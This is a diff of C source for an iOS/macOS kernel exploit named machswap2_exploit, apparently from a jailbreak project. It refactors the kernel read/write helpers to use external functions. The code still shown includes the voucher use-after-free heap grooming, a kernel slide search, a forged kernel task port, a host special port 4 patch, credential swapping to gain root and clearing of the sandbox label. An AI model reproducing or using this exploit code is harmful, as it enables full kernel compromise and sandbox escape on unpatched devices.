@@ -616,72 +616,19 @@ err:
     return 0x0;    
 }
 
-static uint64_t kalloc(mach_port_t the_one, uint64_t size)
-{
-    kern_return_t ret;
-    mach_vm_address_t addr; 
-
-    ret = mach_vm_allocate(the_one, (mach_vm_address_t *)&addr, (mach_vm_size_t)size, VM_FLAGS_ANYWHERE);
-    if (ret != KERN_SUCCESS)
-    {
-        LOG("failed to call mach_vm_allocate(0x%llx): %x %s", size, ret, mach_error_string(ret));
-        return (uint64_t)0x0;
-    }
-
-    return (uint64_t)addr;
-}
-
-static void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
-{
-    kern_return_t ret;
-    size_t offset = 0;
-
-    while (offset < size) 
-    {
-        mach_vm_size_t sz, chunk = 0xfff;
-        if (chunk > size - offset) 
-        {
-            chunk = size - offset;
-        }
-        
-        ret = mach_vm_read_overwrite(port, addr + offset, chunk, (mach_vm_address_t)buf + offset, &sz);
-        if (ret != KERN_SUCCESS || 
-            sz == 0) {
-            LOG("failed to call mach_vm_read_overwrite (%llx): %x %s", addr, ret, mach_error_string(ret));
-            break;
-        }
-
-        offset += sz;
-    }
-}
-
-static uint64_t kread64(mach_port_t port, uint64_t addr)
-{
-    uint64_t val = 0x0;
-    kread(port, addr, (void *)&val, sizeof(val));
-    return val;
-}
-
-static void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
-{
-    kern_return_t ret;
-
-    ret = mach_vm_write(port, addr, (vm_offset_t)buf, (mach_msg_type_number_t)len);
-
-    if (ret != KERN_SUCCESS)
-    {
-        LOG("failed to call mach_vm_write(0x%llx, 0x%p, 0x%zx): %x %s", addr, buf, len, ret, mach_error_string(ret));
-    }
-}
-
-static void kwrite64(mach_port_t port, uint64_t addr, uint64_t val)
-{
-    kwrite(port, addr, &val, sizeof(val));
-}
+extern size_t kread(uint64_t where, void* p, size_t size);
+extern size_t kwrite(uint64_t where, const void* p, size_t size);
+extern uint64_t kmem_alloc(uint64_t size);
+extern void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0);
+extern void prepare_rwk_via_tfp0(mach_port_t port);
+extern uint64_t kernel_base;
+extern uint64_t kernel_slide;
+extern uint64_t ReadKernel64(uint64_t kaddr);
+extern void WriteKernel64(uint64_t kaddr, uint64_t val);
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
-kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
+kern_return_t machswap2_exploit(machswap_offsets_t *offsets)
 {
     kern_return_t ret = KERN_SUCCESS;
 
@@ -916,8 +863,8 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
         hopefully our target port is now allocated on a page which contains only our 
         controlled ports. this means when we release all of our ports *all* allocations
         on the given page will be released, and when we trigger GC the page will be released
-        back from the ipc_ports zone to be re-used by kalloc 
-        this allows us to spray our fake vouchers via IOSurface in other kalloc zones 
+        back from the ipc_ports zone to be re-used by kalloc
+        this allows us to spray our fake vouchers via IOSurface in other kalloc zones
         (ie. kalloc.1024), and the dangling pointer of the voucher will then overlap with one
         of our allocations
     */
@@ -1055,6 +1002,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
 found_voucher_lbl:;
 
     the_one = real_port_to_fake_voucher;
+    prepare_for_rw_with_fake_tfp0(the_one);
     uint64_t original_port_addr = target_voucher->iv_port;
 
     fake_ipc_voucher_t new_voucher = (fake_ipc_voucher_t)
@@ -1154,6 +1102,7 @@ found_voucher_lbl:;
     }
 
     the_one = real_port_to_fake_voucher;
+    prepare_for_rw_with_fake_tfp0(the_one);
 
     if (!MACH_PORT_VALID(the_one))
     {
@@ -1343,7 +1292,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
 #define KERNEL_HEADER_OFFSET        0x4000
 #define KERNEL_SLIDE_STEP           0x100000
     
-    uint64_t kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
+    kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
 
     do
     {
@@ -1359,8 +1308,8 @@ value = value | ((uint64_t)read64_tmp << 32);\
         kernel_base -= KERNEL_SLIDE_STEP;
     } while (true);
 
-    uint64_t kslide = kernel_base - offsets->constant.kernel_image_base;
-    LOG("kslide: 0x%llx", kslide);
+    kernel_slide = kernel_base - offsets->constant.kernel_image_base;
+    LOG("kernel_slide: 0x%llx", kernel_slide);
 
     /* find realhost */
     ret = send_port(the_one, host);
@@ -1511,7 +1460,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
         write(wfd, pipebuf, pagesize);\
     }
 
-    uint64_t kbase_val = kread64(the_one, kernel_base);
+    uint64_t kbase_val = ReadKernel64(kernel_base);
     if ((uint32_t)kbase_val != MH_MAGIC_64)
     {
         LOG("failed to find kbase val! got: %llx", kbase_val);
@@ -1525,7 +1474,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
         that's not backed on a pipebuffer
     */
 
-    uint64_t kernel_task_buf = kalloc(the_one, 0x600);
+    uint64_t kernel_task_buf = kmem_alloc(0x600);
     if (kernel_task_buf == 0x0)
     {
         LOG("failed to allocate kernel_task_buf!");
@@ -1541,12 +1490,12 @@ value = value | ((uint64_t)read64_tmp << 32);\
         we use it for storing the kernel base and kernel slide values 
     */ 
     *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
-    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_size) = kslide;
+    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_size) = kernel_slide;
 
-    kwrite(the_one, kernel_task_buf, (void *)fake_task, 0x600);
+    kwrite(kernel_task_buf, (void *)fake_task, 0x600);
 
     /* allocate kernel port */
-    uint64_t kernel_port_buf = kalloc(the_one, 0x300);
+    uint64_t kernel_port_buf = kmem_alloc(0x300);
     if (kernel_port_buf == 0x0)
     {
         LOG("failed to allocate kernel_port_buf!");
@@ -1555,26 +1504,26 @@ value = value | ((uint64_t)read64_tmp << 32);\
     }
     LOG("kernel_port_buf: 0x%llx", kernel_port_buf);
 
-    kwrite64(the_one, new_voucher.iv_port + offsetof(kport_t, ip_kobject), kernel_task_buf);
+    WriteKernel64(new_voucher.iv_port + offsetof(kport_t, ip_kobject), kernel_task_buf);
 
     /* our fakeport lies just before our task buf in our pipebuf */
-    kwrite(the_one, kernel_port_buf, (void *)pipebuf, PIPEBUF_TASK_OFFSET);
+    kwrite(kernel_port_buf, (void *)pipebuf, PIPEBUF_TASK_OFFSET);
 
     /*
         host_get_special_port(4) patch
         allows the kernel task port to be accessed by any root process 
     */
-    kwrite64(the_one, realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);
+    WriteKernel64(realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);
 
     /* eleveate creds to kernel */
     
-    uint64_t orig_ucred = kread64(the_one, ourproc + offsets->struct_offsets.proc_ucred);
+    uint64_t orig_ucred = ReadKernel64(ourproc + offsets->struct_offsets.proc_ucred);
     LOG("original ucred: 0x%llx", orig_ucred);
 
     int orig_uid = getuid();
 
-    uint64_t kern_ucred = kread64(the_one, kernproc + offsets->struct_offsets.proc_ucred);
-    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
+    uint64_t kern_ucred = ReadKernel64(kernproc + offsets->struct_offsets.proc_ucred);
+    WriteKernel64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
     
     LOG("setuid: %d, uid: %d", setuid(0), getuid());
     if (getuid() != 0)
@@ -1592,7 +1541,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
     
     /* de-elevate */
 
-    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
+    WriteKernel64(ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
     
     LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
     if (getuid() != orig_uid)
@@ -1603,18 +1552,20 @@ value = value | ((uint64_t)read64_tmp << 32);\
     }
     
     /* unsandbox */
-    uint64_t cr_label = kread64(the_one, orig_ucred + 0x78);
-    kwrite64(the_one, cr_label + 0x10, 0);
+    uint64_t cr_label = ReadKernel64(orig_ucred + 0x78);
+    WriteKernel64(cr_label + 0x10, 0);
 
     if (ret != KERN_SUCCESS ||
         !MACH_PORT_VALID(hsp4))
     {
         LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
-        goto out;   
+        goto out;
     }
+    
+    prepare_rwk_via_tfp0(hsp4);
 
     /* test it */
-    kbase_val = kread64(hsp4, kernel_base);
+    kbase_val = ReadKernel64(kernel_base);
     if ((uint32_t)kbase_val != MH_MAGIC_64)
     {
         LOG("failed to read kernel base!");
@@ -1627,8 +1578,6 @@ value = value | ((uint64_t)read64_tmp << 32);\
     LOG("base: 0x%llx", kbase_val);
     LOG("Success!");
 
-    *tfp0_back = hsp4;
-    *kbase_back = kernel_base;
     ret = KERN_SUCCESS;
 
 out:;
